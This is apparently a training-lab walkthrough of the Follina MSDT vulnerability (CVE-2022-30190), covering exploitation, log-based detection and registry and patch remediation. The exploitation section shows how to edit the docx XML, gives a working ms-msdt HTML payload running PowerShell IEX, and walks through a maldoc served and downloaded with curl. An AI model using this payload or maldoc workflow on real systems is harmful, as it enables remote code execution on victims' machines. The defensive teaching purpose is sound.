<h1>Introduction</h1>
<p>Follina is the name given to a remote code execution (RCE) vulnerability in the Microsoft Support Diagnostic Tool (MSDT). This vulnerability allows a remote attacker to use a Microsoft Office document template to execute code via MSDT and download a malicious payload from a remote URL. It affects Office 2013, 2016, 2019, 2021, Office ProPlus and Office 365. &nbsp;</p>
<p>Follina exploits MSDT but what is MSDT? Microsoft Support Diagnostic Tool (MSDT) is a service used for gathering diagnostic data about the system. Microsoft Office is executing code via msdt (a support tool) even if macros are disabled. Protected View does kick in, although if you change the document to RTF form, it runs without even opening the document (via the preview tab in Explorer).</p>
<p><a href="https://docs.microsoft.com/en-us/troubleshoot/sql/general/answers-questions-msdt">Microsoft</a> states that “the Microsoft Support Diagnostic Tool (MSDT) collects information to send to Microsoft Support.&nbsp;They will then analyze this information and use it to determine the resolution to any problems that you may be experiencing on your computer”</p>
<p>With that in mind, it’s essentially a way for Microsoft Support to immediately see what’s wrong as they’re getting all the information they need straight from the source</p>
<p>Think of it like this - you’re having car problems and you don’t know about cars at all. You call your trusty car mechanic, but instead of him asking you to check different parts of the car while he tries to deduce what’s wrong with it remotely, he just gives you a passkey, instructs you how to use it and the car will magically produce a report that you can then send to the mechanic. Quick, easy, and efficient.</p>

<h1>CVE-2022-30190</h1>
<p>The MSDT exploit is not something new - in fact, a bachelor’s thesis has been published August of 2020 regarding techniques on how to use MSDT for code execution. Almost two years after that initial publication, pieces of evidence of MSDT exploitation as well as code execution via Office URIs has triggered several independent researchers to file separate reports to <a href="https://msrc-blog.microsoft.com/">MSRC</a>, the latter of which has been patched (specifically in Microsoft Teams) whereas the former remained vulnerable</p>
<p>It’s not until the discovery of&nbsp;<a href="https://twitter.com/nao_sec">nao_sec</a>, which has been made public in twitter, that attacks using this particular vector is actively being made in the wild. This is consequently picked up by&nbsp;<a href="https://twitter.com/GossiTheDog">Kevin Beaumont</a>&nbsp;who publicly identified it as a zero day that Microsoft EDR products are failing to detect, and then later classified by Microsoft as a zero day with the vulnerability name CVE-2022-30190</p>

<h1>Exploitation</h1>
<p>Before we do any exploitation in the machine, let’s first try and make sense of the baseline processes of the machine. It is in having a sense of normalcy that we’d be able to spot minute changes later on that may consequently reveal malicious activity by a threat actor in our environment.</p>
<p>The <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer">process explorer</a> from sysinternals has already been downloaded and pinned in the taskbar for easier access. Proceed to open it and scan through the processes currently running in the machine. Keep it open as we go through the activities later on so you'd be able to immediately see how an exploited follina-msdt vulnerability would look like as compared to the "baseline" - the processes that we're seeing while the machine is immaculate.</p>
<p><strong>Exploit Explanation</strong></p>
<p>Let’s start with a disclaimer: for our purposes, we’ll be loading our payload via a word document, particularly in the .docx format - this is the original exploit that has been <a href="https://www.virustotal.com/gui/file/4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784/detection">discovered in the wild</a>. However, this vulnerability has been proved to work in a number of other office products, and the student is obliged to maximize learning by trying them out separately.</p>
<p>Two important aspects of this vulnerability are: 1) specific docx files contain OLE (originally abbreviates to Object Linking and Embedding) Object references, and sometimes, they take the form of HTML files hosted elsewhere, and 2) MS-MSDT allows for code execution.</p>
<p>Combining the above two aspects together, an MS-MSDT HTML scheme can be used to execute PowerShell code, and that a docx file can be used to load it via word’s external reference capability.</p>
<p>More specifically, drilling into the docx structure, the <i>word/_rels/document.xml.rels </i>file has an XML tag&nbsp;<code>&lt;Relationship&gt;</code> with an attribute&nbsp;<code>Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"</code> that describes an external oleObject reference. In order to exploit this docx feature, we can edit the contents of this tag to point instead to the payload that we're hosting by changing the <code>Target</code>&nbsp;value into <code>http://&lt;external_payload_server.com&gt;/&lt;payload.html&gt;</code> and the <code>TargetMode</code> value into <code>"External"</code>.</p>
<p>In the <i>word/document.xml</i> file, there's an XML tag that starts with <code>&lt;o:OLEObject...&gt;</code>&nbsp;wherein we should change the Type value to <code>"Link"</code> and then add the Key-Value pair attribute <code>UpdateMode="OnCall"</code>.</p>
<p>The only thing left to do now is to host the payload that the word file will be connecting to, and receiving instructions from upon opening of the file. This is done by creating an html file with a structure similar to this:</p>
<pre><code class="language-plaintext">&lt;!doctype html&gt;
&lt;html lang="en"&gt;
&lt;body&gt;
&lt;script&gt;
//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA should be repeated &gt;60 times
  window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=h$(IEX('calc.exe'))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe \"";
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
In the above contents of the html file, you'd notice the ms-msdt:/id PCWDiagnostic /skip force /param command, along with the command switches you can use to set the command you want to execute in the target machine. You can then mix and match the payload according to your purposes.</code></pre>
<p>As such, we now have a way to achieve remote code execution without touching any macros, and as we'll see later, without even opening the malicious document.</p>
<p><strong>Publicly Available Exploit Focus:&nbsp;</strong><a href="https://github.com/JohnHammond/msdt-follina">JohnHammond/msdt-follina</a></p>
<p>John Hammond has created a tool to automate the process of creating a malicious document (maldoc) and consequently host the malicious html file that houses the bad command. The tool is documented in the link above, and we will be using a forked version of it to further understand the concept of the exploit touched upon earlier.</p>
<p>To start with our experiment, open a terminal instance in your Attackbox and enter the following command:</p>
<p>msdt-follina</p>
<pre><code class="language-plaintext">root@attackbox:~# cd ~/Rooms/Follina-MSDT</code></pre>
<p>We change our working directory to&nbsp;~/Rooms/Follina-MSDT, where the&nbsp;<strong>msdt-follina</strong>&nbsp;repository has been cloned for you.</p>
<p>Launch the exploit</p>
<pre><code class="language-plaintext">root@attackbox:~/Rooms/Follina-MSDT# python3.9 follina.py
[+] copied staging doc /tmp/[random string]
[+] created maldoc ./follina.doc
[+] serving html payload on :8000</code></pre>
<p>Upon firing up the exploit, you should be hosting the file already, so it’s ready to be “delivered” to the victim machine. Effective delivery mechanisms of malicious payloads are outside the scope of this room, so we’ll just settle for a simpler way of transferring files from linux to windows:</p>
<p>While keeping the original terminal open, open another terminal in your Attackbox and enter the following command:</p>
<p>Simple HTTP Server</p>
<pre><code class="language-plaintext">root@attackbox:~# cd ~/Rooms/Follina-MSDT 
root@attackbox:~/Rooms/Follina-MSDT# python -m http.server 3456
Serving HTTP on 0.0.0.0 port 3456 (http://0.0.0.0:3456/) ...</code></pre>
<p>Start the Windows machine and wait for it to initialize. When everything's settled, proceed to open a command prompt and enter the following command:</p>
<p>Maldoc Download</p>
<pre><code class="language-plaintext">Microsoft Windows [Version]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator&gt; cd Desktop
C:\Users\Administrator\Desktop&gt; curl http://[attackbox IP]:3456/follina.doc -o follina.docx
</code></pre>
<p>This downloads the maldoc in our machine and as such, shortly after, you should be able to see the word file named follina.docx appear in the Desktop, ready to be run. When you're ready, open the file and watch what happens.</p>
<p>For now, let's allow the maldoc and all of the stuff that it spawned, to remain running, while we examine the contents of the process explorer.</p>
<p><strong>Process Explorer</strong></p>
<p>Looking at the process explorer may be daunting as there are a ton of processes always running within the machine. In our case, we haven't done a lot of stuff with it and yet the number of running processes already covers the entire screen. This is where the importance of "making sense of the baseline", discussed in the first part of this task, is emphasized.</p>
<p>If you don't have any established baseline, it's easy to get paranoid and everything will suddenly seem to be suspicious. This is where you start wasting your time checking each and every process there is - mainly because you're unfamiliar with each and every one of them.</p>
<p>Scrolling through the processes, you'll be able to spot <strong>WINWORD.EXE</strong> immediately, followed by an <strong>msdt.exe</strong> child process. Somewhere in the list of processes you'll be able to see a process for the calculator as well which is the <strong>win32calc.exe</strong>. It might look something like this, although it's completely normal if the WINDWORD.EXE and the win32calc.exe are far away from each other.</p>
<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/c88e19f2ecbbac119deabd3377309580.png"></figure>
<p><br>&nbsp;</p>
<p>Now, finding these artifacts are easy because we already know what to look for, but how do we tackle the ones that we don't know about, the so called <i>unknown unknowns</i>? Well, we can refer to the baseline that we have, we compare, and then we validate.</p>
<p><strong>"Zero Click" Implementation</strong></p>
<p>In order to replicate the “zero click” implementation of this vulnerability, we simply head to the malicious word file,&nbsp;add a cute message (completely optional),&nbsp;&nbsp;save it in the Rich Text Format (RTF), and we’re good to go.&nbsp;This implementation assumes that the victim machine is in the preview pane view, else it will revert to the original functionality which will still run upon opening of the file.</p>
<p>﻿Open the file explorer and navigate to the <strong>Desktop</strong>&nbsp;folder. There you will see the seemingly honest file that we made that needs clicking, proceed to click it once careful not to actually open it and see what will happen.</p>
<p>Despite not actually opening the file, the exploit ran in the same manner that it did earlier in this exercise.&nbsp;This happened because of two key features: 1) the feature of the File Explorer to preview files before opening them, and 2) the RTF which allows the feature of document files being able to be previewed in the File Explorer before being opened (among other purposes).</p>
<p>Combining the two and then abusing them will result in an attack vector that we’ve just witnessed now.</p>
<h1>Detection</h1>
<p><strong>Threat hunting</strong></p>
<p>﻿The Windows machine that we’ve used to study the exploitation of the vulnerability has been pre-configured to have logging enabled for:</p>
<ul>
  <li>Audit Process Creation</li>
  <li>Command Line Process Auditing, and</li>
  <li>Script Block Logging</li>
</ul>
<p>These auditing mechanisms are <strong>not configured</strong>&nbsp;by default and as such, it is imperative that these are turned on in your own environments to aid in the detection of suspicious behavior, and to help keep valuable data available for forensic examiners.</p>
<p>During the previous task, we've identified a number of interesting process creations upon the exploitation of the vulnerability. These process creations are logged in Windows Security Logs, ready to be analyzed via your favorite viewer, or forwarded to a centralized log collector to be processed then further used later on.</p>
<p>For this task we'll be using <a href="http://www.nirsoft.net/utils/full_event_log_view.html">Event Log Viewer for Windows</a> by Nirsoft to check out the process creations we've identified earlier. We will then look for details within these process creations that we can use to look for clues in other event logs to explain better what happened behind the scenes. The Event Log Viewer has been pinned in the Taskbar for you.</p>
<p>Proceed to open FullEventLogView pinned in your taskbar. Go to <i>View</i> &gt; <i>Use Quick Filter</i>. A search bar should appear on top of the logs which would allow us to do quick searches. Since we wanted to check the details of our process creations, we can click on the left-most drop down menu and choose <i>Find Event ID (space/comma...)</i>, then type <i>4688</i>&nbsp;to the search bar provided as shown below:</p>
<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/d1702225acb5cfc44ab029192a455ca4.png"></figure>
<p>The screen should populate with Process Creation events and you'll notice&nbsp;immediately&nbsp;&nbsp;that there's a ton of them, despite having minimal interaction with the machine.</p>
<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/f805b0a62927fff054b878a295605e80.png"></figure>
<p>The first artifact we'll check is winword.exe - understanding the flow of events from this process gives us an idea how an office process in general, will behave in the context of an msdt exploitation. Hit&nbsp;<i>Ctrl+F&nbsp;</i>to spawn a&nbsp;<i>Find function</i>&nbsp;and type in winword.&nbsp;</p>
<p>The first entry that you'll probably see is the one where WINWORD.EXE is the new process being created, identified by the detail: <i>New Process Name</i>. This process marks the opening of the <i>follina.docx </i>file, via by the detail: <i>Process Command Line</i>. It should look like the one below, though it's completely normal for it not to look exactly the same.</p>
<figure class="image image_resized" style="width:846px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/0aa4ce4c1527a9d1b160302e7a186d8d.png"></figure>
<p>Click the <i>Find Next</i> button until you find an entry that looks something like this:</p>
<figure class="image image_resized" style="width:1220.17px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/bab2ae3b9ce95e9af6db64e617b35dad.png"></figure>
<p>Here we'll see that the WINWORD.EXE is the Creator Process, more commonly known as the <strong>Parent Process</strong>&nbsp;of msdt.exe. Notice the long command line entry that contains multiple PowerShell cmdlets (pronounced command-lets) as well as multiple directory traversals. Seeing this, on its own, in your environment should raise immediate red flags. One free nugget that we can look closely here is the string <strong>Y2FsYw==</strong>&nbsp;that when decoded would result in the string <i>calc.</i></p>
<p>Since we saw PowerShell cmdlets, it would make sense for us to filter out PowerShell events to further check this lead. Since there's a lot of unique event IDs that log PowerShell events, we can filter via Provider. Go to <i>Options</i> &gt; <i>Advanced Options</i>. Click the second dropdown menu and select <i>Show only the specific providers (comma-delimited...)</i>. Type PowerShell enclosed with wildcards (*) so all providers with regards to PowerShell will be included.</p>
<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/671f03a57359033de387b25a1d087300.png"></figure>
<p>Clear the "Quick Filter" box of the 4688 we entered earlier, and the screen should populate with events that exclusively come from PowerShell providers. From here, we can filter the events via part of the PowerShell command we've noted above.</p>
<figure class="image image_resized" style="width:1221px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/bb40ec87492639e3e808b7a38b5e586c.png"></figure>
<p>Upon arriving in this event, we can close the find function and then proceed to follow the trail of this Scriptblock text; you can navigate to the next event by pressing the down key in your keyboard, or manually clicking the event. Exploring the immediate events that follow this scriptblock text will show the step-by-step execution of calc in the perspective of PowerShell.</p>
<p>There's still a lot to be explored in the above scriptblock alone but for the sake of brevity, it will be left to the student to explore further and see what else they can uncover. Questions at the end of this task may serve as guide as well.</p>
<p>Sigma rule availability</p>
<p>Huntress Detection Engineer Matthew Brennan has created a sigma rule to detect suspicious MSDT executions in the environment and the best thing about it is that it keeps getting updated whenever the community spots something new.</p>
<p>The sigma rule can be found&nbsp;<a href="https://gist.github.com/matthewB-huntress/14ab9d309f25a05fc9305a8e7f351089">here</a>.</p>
<p><a href="https://uncoder.io/">Uncoder.IO</a>&nbsp;is a nice tool that helps convert sigma rules to queries that can be immediately used within a SIEM of your choice.</p>
<p>In hunting for MSDT exploits around the environment, you may opt to use the sigma rule as a detection mechanism for both:</p>
<ol>
  <li>Analytics for use in near real time detections of exploits, and</li>
  <li>Retroactive checks of prior intrusions</li>
</ol>
<p>MSDT also uses another <a href="https://twitter.com/KyleHanslovan/status/1531114931973767168">binary</a>&nbsp;to channel executions and so, suspicious child processes with it as the parent should be noted and further investigated. The "redacted" information above is an answer to a question in the previous task - check at your own spoilage.</p>

<p><strong>Antivirus / Windows Defender</strong></p>
<p>A number of Microsoft Defender products have detection mechanisms in place and our trusty <a href="https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/">Microsoft Security Response Center</a> provides us a list of those.</p>
<h1>Remediation</h1>
<p>The patch for this vulnerability is in the June 2022 cumulative <a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-30190">Windows Updates</a>. It is imperative that users install these updates to be protected from the vulnerability.</p>
<p>You can either do this manually every so often, which isn’t very efficient and prone to be forgotten, or you can opt to automate checking and installation of updates. Nowadays it’s as easy as typing “updates” in the search bar and it will immediately bring you to the updates section of the computer’s settings.</p>
<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/384b4ff19504919caa6646c149a0c686.png"></figure>
<p><strong>Disable MSDT URL Protocol</strong></p>
<p>Before the patch has been introduced, security teams scrambled their organization’s IT Administrators to immediately disable the MSDT URL Protocol.&nbsp;By disabling the MSDT URL Protocol, troubleshooters will not be launched as links and so ms-msdt won’t be able to be called by Office.</p>
<p>To disable the protocol, first run a command prompt as administrator (for our VM, it's automatically ran as administrator).&nbsp;</p>
<p>ms-msdt url backup and deletion</p>
<pre><code class="language-plaintext">Microsoft Windows [Version]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator&gt; cd Desktop
C:\Users\Administrator\Desktop&gt; reg query HKEY_CLASSES_ROOT\ms-msdt

HKEY_CLASSES_ROOT\ms-msdt
          [...]

HKEY_CLASSES_ROOT\ms-msdt\shell

C:\Users\Administrator\Desktop&gt; reg export HKEY_CLASSES_ROOT\ms-msdt ms-msdt_backup
The operation completed successfully.

C:\Users\Administrator\Desktop&gt; reg delete HKEY_CLASSES_ROOT\ms-msdt /f
The operation completed successfully.

C:\Users\Administrator\Desktop&gt; reg query HKEY_CLASSES_ROOT\ms-msdt
ERROR: The system was unable to find the specified registry key or value.</code></pre>
<p>By now, you must have noticed that we're always changing our working directory to the Desktop - it's so we can immediately see the changes that our commands are introducing to the environment: file creation is fairly noticeable. It is by no means, however, the best practice to do in any environment.</p>
<p>The first <strong>reg query</strong>&nbsp;command that we've introduced is a quick check that the key exists. It is followed by <strong>reg export</strong>&nbsp;that exports our key into a file so we may be able to reintegrate it in our system later on when Microsoft comes up with a more permanent fix to this vulnerability. The exported file is saved in the current working directory - in our case the Desktop.</p>
<p>The <strong>reg delete</strong>&nbsp;command is the command that actually disables the MSDT URL Protocol mainly because it essentially removes it altogether from the system. The final <strong>reg query</strong>&nbsp;command is a confirmatory check that the key no longer exists.</p>
<p>Upon disabling the MSDT URL Protocol in our Windows machine, let's try to trigger the exploit again, and see how it impacts the machine. This is a good way to check if our controls would be able to catch attacks, regardless if they're successful or not.</p>
<p><strong>Attack Surface Reduction (ASR)</strong></p>
<p>If you’re using <strong>Microsoft Defender for Endpoint</strong> in your environment, enable the ASR rule <strong>Block all Office applications from creating child</strong>.&nbsp;Creating child processes from services that should not have been doing that is a common theme among malwares.</p>
